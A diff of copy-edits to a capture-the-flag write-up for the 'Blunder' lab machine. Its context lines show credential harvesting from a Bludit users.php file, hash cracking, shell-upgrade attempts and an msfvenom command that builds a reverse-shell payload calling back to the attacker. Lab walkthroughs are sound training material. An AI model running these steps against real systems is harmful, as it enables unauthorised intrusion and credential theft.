@@ -199,9 +199,9 @@ find / -user www-data 2> /dev/null
 /var/www/bludit-3.10.0a
 ```
 
- The command returns a lot for files and directories but the most important one appears to be: `/var/www/bludit-3.10.0a`. So, we can start enumerating the files present in this directory and see if we can find something useful.
+The command returns a lot for files and directories but the most important one appears to be: `/var/www/bludit-3.10.0a`. So, we can start enumerating the files present in this directory and see if we can find something useful.
 
-After going through multiple files in the mentioned directory. We can find credentials for user `Huge` in the file: `/var/www/bludit-3.10.0a/bl-content/databases/users.php`
+After going through multiple files in the mentioned directory. We can find credentials for user `Hugo` in the file: `/var/www/bludit-3.10.0a/bl-content/databases/users.php`
 
 ```
 pwd
@@ -232,14 +232,14 @@ cat users.php
 
 We can use this password hash and head over to [CrackStation](https://crackstation.net/) to get the password. 
 
-Even though now that we have the credentials for user 'Hugo', we can switch user because we don't have a stable shell. To convert this unstable shell to a stable one we can try commands like:
+Even though now that we have the credentials for user 'Hugo', we can't switch user because we don't have a stable shell. To convert this unstable shell to a stable one we can try commands like:
 
 ```
 1. python -c ‘import pty;pty.spawn(“/bin/bash”)’
 2. echo os.system('/bin/bash')
 ```
 
-But none of these work. We can try to create a custom payload using `msfvenom`, send it to the target machine and execute it as:
+But none of these works. We can try to create a custom payload using `msfvenom`, send it to the target machine and execute it as:
 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=<your_ip> LPORT=443 -f elf > shell.elf
@@ -324,7 +324,7 @@ root@blunder:/home/hugo# cat /root/root.txt
 cat /root/root.txt
 ```
 
-With exploiting this simple vulnerability we get root access and can read the flag as well!
+By exploiting this simple vulnerability we get root access and can read the flag as well!
 
 With this, we pwned the Blender machine!
 
